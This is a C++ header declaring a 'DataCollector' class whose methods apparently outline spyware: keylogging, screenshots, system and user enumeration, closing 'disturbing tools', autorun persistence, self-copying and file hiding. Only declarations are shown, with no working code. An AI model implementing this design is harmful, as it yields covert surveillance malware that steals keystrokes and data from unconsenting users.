#pragma once

#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <chrono>
#include <unordered_set>

using std::cout;
using std::string;
using std::endl;

class DataCollector
{
private:
	unsigned int counter;
	std::ofstream outputFile;
	string winVer; // I want to save runtime
	string path; // ditto

	string specialKeys(int key);
	void getPath();
public:
	DataCollector();
	void closeDisturbingTools();
	void increaseCounter();
	unsigned int getCounter();
	void keyLogging();
	void screenShot(const char* BmpName);
	void netStat();
	void findUserName();
	void findGroups();
	void winVersion(bool firstRun);
	void findProcesses();
	void findIP();
	void autoRun();
	void programCopy();
	void hideFile();
	void changeBackground();
	string getPathstr();
};